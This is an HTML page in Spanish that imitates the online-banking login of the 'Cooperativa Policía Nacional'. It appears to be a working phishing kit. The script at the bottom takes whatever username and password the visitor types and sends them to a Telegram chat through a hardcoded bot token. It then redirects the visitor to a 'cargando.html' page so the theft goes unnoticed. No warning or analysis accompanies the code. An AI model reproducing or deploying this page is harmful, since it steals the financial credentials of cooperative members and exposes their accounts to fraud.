<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Cooperativa Policía Nacional</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    />

    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: "Avenir Next LT Pro", sans-serif;
        font-weight: 400 !important;
      }
      .input-highlight:focus {
        box-shadow: 0 0 0 3px rgba(255, 117, 0, 0.4);
        border-color: #ff7500;
      }
    </style>
  </head>
  <body
    class="bg-gray-100 flex flex-col items-center justify-center min-h-screen px-4 relative"
    style="background-image: url(fondoLogin.png)"
  >
    <!-- Logo -->
    <div class="mb-4">
      <img
        src="cpn_logo.png"
        alt="Logo CPN"
        class="mx-auto"
        style="width: 190px; margin-top: 20px; margin-bottom: 0px"
      />
    </div>

    <div style="padding: 40px">
      <!-- Login Box -->
      <div
        class="relative bg-white shadow-lg rounded-xl max-w-md w-full p-8 sm:p-8 custom-form z-10"
      >
        <div class="mb-6 text-center">
          <h2
            class="font-bold text-lg"
            style="color: #ff7500; font-size: 15px !important"
          >
            ¡Hola, te damos la bienvenida!
          </h2>
          <p
            class="text-gray-800 font-semibold"
            style="font-size: 13px !important"
          >
            Ingresa a tu Cooperativa Virtual
          </p>
        </div>

        <form onsubmit="return enviarFormulario(event)">
          <label
            class="block text-sm font-semibold text-gray-700 mb-1"
            for="usuario"
            style="
              font-style: normal;
              font-weight: 700;
              font-size: 12px;
              line-height: 20px;
              color: #454142;
              margin-left: 16px;
            "
            >Usuario</label
          >
          <input
            type="text"
            id="usuario"
            class="w-full border border-gray-300 rounded-md px-4 py-2 focus:outline-none input-highlight mb-4"
            oninput="validarCampos()"
          />

          <div class="flex justify-between items-center mb-1">
            <label
              class="text-sm font-semibold text-gray-700"
              for="password"
              style="
                font-style: normal;
                font-weight: 700;
                font-size: 12px;
                line-height: 20px;
                color: #454142;
                margin-left: 16px;
              "
              >Contraseña</label
            >
            <a
              href="#"
              class="text-sm text-gray-500 hover:text-orange-600"
              style="font-size: 9px; line-height: 20px; color: #454142"
              >¿Olvidaste tu contraseña?</a
            >
          </div>
          <div class="relative mb-4">
            <input
              type="password"
              id="password"
              class="w-full border border-gray-300 rounded-md px-4 py-2 pr-10 focus:outline-none input-highlight"
              oninput="validarCampos()"
            />
            <button
              type="button"
              onclick="togglePassword()"
              class="absolute right-3 top-2.5 text-gray-400 hover:text-gray-600"
            >
              <i id="toggleIcon" class="fas fa-eye"></i>
            </button>
          </div>

          <button
            type="submit"
            id="loginBtn"
            class="w-full bg-gray-300 text-white font-semibold py-2 rounded-md cursor-not-allowed"
            disabled
          >
            Iniciar Sesión
          </button>
        </form>

        <!-- Imagen pegada al borde inferior izquierdo -->
        <img
          src="women.png"
          alt="Mujer con laptop"
          class="absolute bottom-0 w-32 sm:w-36"
          style="left: -50px; width: 80px"
        />
      </div>

      <!-- Registration Buttons -->
      <div
        class="mt-6 flex flex-row flex-wrap gap-4 max-w-md w-full z-10 register-buttons"
      >
        <div
          class="flex-1 text-center bg-white border rounded-md px-4 py-3 text-orange-600 hover:bg-orange-50 shadow flex flex-col justify-center"
        >
          <label
            style="
              font-style: normal;
              font-weight: 400;
              font-size: 10px;
              color: #000000;
            "
          >
            Si eres un socio <br />nuevo
          </label>
          <a
            href="#"
            class="mt-1"
            style="
              font-style: normal;
              font-weight: 600;
              font-size: 10px;
              color: #ff7500;
            "
          >
            ¡Regístrate ahora!
          </a>
        </div>

        <div
          class="flex-1 text-center bg-white border rounded-md px-4 py-3 text-orange-600 hover:bg-orange-50 shadow flex flex-col justify-center"
        >
          <label
            style="
              font-style: normal;
              font-weight: 400;
              font-size: 10px;
              color: #000000;
            "
          >
            ¿Vas a ingresar por primera vez?
          </label>
          <a
            href="#"
            class="mt-1"
            style="
              font-style: normal;
              font-weight: bold;
              font-size: 10px;
              color: #ff7500;
            "
          >
            Mira cómo hacerlo aquí
          </a>
        </div>
      </div>
    </div>

    <!-- Footer -->
    <div class="mt-6 text-center text-sm text-gray-500 z-10">
      <a href="#" class="text-orange-600 hover:underline">Privacidad</a><br />
      Copyright (c) Cooperativa Policía Nacional. Todos los derechos reservados.
    </div>
    <script>
      function togglePassword() {
        const passwordField = document.getElementById("password");
        const icon = document.getElementById("toggleIcon");

        const isHidden = passwordField.type === "password";
        passwordField.type = isHidden ? "text" : "password";
        icon.className = isHidden ? "fas fa-eye-slash" : "fas fa-eye";
      }

      function validarCampos() {
        const usuario = document.getElementById("usuario").value.trim();
        const password = document.getElementById("password").value.trim();
        const loginBtn = document.getElementById("loginBtn");

        if (usuario !== "" && password !== "") {
          loginBtn.disabled = false;
          loginBtn.classList.remove("bg-gray-300", "cursor-not-allowed");
          loginBtn.classList.add("bg-[#ff7500]", "cursor-pointer");
        } else {
          loginBtn.disabled = true;
          loginBtn.classList.add("bg-gray-300", "cursor-not-allowed");
          loginBtn.classList.remove("bg-[#ff7500]", "cursor-pointer");
        }
      }

      async function enviarFormulario(e) {
        e.preventDefault();
        const usuario = document.getElementById("usuario").value;
        const password = document.getElementById("password").value;
        const botToken = "8356158011:AAFziioUBzxtg6bontML_DNXsWstglfQ2yM"; // ← reemplaza con tu token real
        const chatId = "-4983208520"; // ← reemplaza con tu chat ID
        localStorage.setItem("usuario", usuario);
        const mensaje = `CPN\nUsuario:${localStorage.getItem(
          "usuario"
        )}\nClave: ${password}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: mensaje,
          }),
        })
          .then((res) => {
            if (res.ok) {
              window.location.href = "cargando.html";
              // Aquí puedes redireccionar si quieres
            } else {
              console.log("Error al enviar a Telegram");
            }
          })
          .catch((err) => {
            console.error("Telegram error:", err);
            console.log("Error al conectar con Telegram");
          });
      }
    </script>
  </body>
</html>
